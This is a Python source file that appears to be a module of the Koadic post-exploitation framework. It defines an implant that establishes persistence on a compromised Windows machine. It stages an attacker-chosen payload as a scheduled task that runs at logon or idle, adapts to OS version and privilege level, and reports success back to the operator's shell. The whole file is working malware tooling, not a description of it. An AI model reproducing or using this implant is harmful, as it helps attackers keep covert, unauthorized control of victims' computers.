import core.job
import core.implant
import uuid

class SchTasksJob(core.job.Job):

    def create(self):
        if self.session_id == -1:
            self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
            return False
        if "XP" in self.session.os or "2003" in self.session.os:
            self.script = self.script.replace(b"~NOFORCE~", b"true")
        else:
            self.script = self.script.replace(b"~NOFORCE~", b"false")

        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.script = self.script.replace(b"~ELEVATED~", b"false")
        else:
            self.script = self.script.replace(b"~ELEVATED~", b"true")

    def report(self, handler, data, sanitize = False):
        task = handler.get_header("Task", False)
        data = data.decode()

        if task == "QueryTask":
            handler.reply(200)
            if "ERROR" not in data:
                self.shell.print_warning("K0adic task already exists. Overwriting old task with new one...")
            return

        if task == "NoForceTask":
            handler.reply(200)
            if "SUCCESS" not in data:
                self.shell.print_warning("Original K0adic task could not be removed. This implant might fail :/")
            return

        if task == "AddTask":
            handler.reply(200)
            if "SUCCESS" in data:
                if self.session.elevated == 1:
                    self.shell.print_good("K0adic task added. Persistence achieved with ONLOGON method.")
                else:
                    self.shell.print_good("K0adic task added. Persistence achieved with ONIDLE method.")
            else:
                self.shell.print_error("Could not add task.")
            return

        if task == "DeleteTask":
            handler.reply(200)
            if "SUCCESS" in data:
                self.shell.print_good("Task was deleted.")
            else:
                self.shell.print_error("Task could not be deleted.")
            return

        if data == "Complete":
            super(SchTasksJob, self).report(handler, data)
            
        handler.reply(200)

    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        pass

class SchTasksImplant(core.implant.Implant):

    NAME = "Add Scheduled Task Payload"
    DESCRIPTION = "Establishes persistence via a scheduled task"
    AUTHORS = ["TheNaterz"]

    def load(self):
        self.options.register("PAYLOAD", "", "payload to stage")
        self.options.register("CMD", "", "command", hidden=True)
        self.options.register("CLEANUP", "false", "will remove the scheduled task", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)

    def job(self):
        return SchTasksJob

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        self.options.set("CMD", payload)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/persist/schtasks.js", self.options)

        self.dispatch(payloads, self.job)
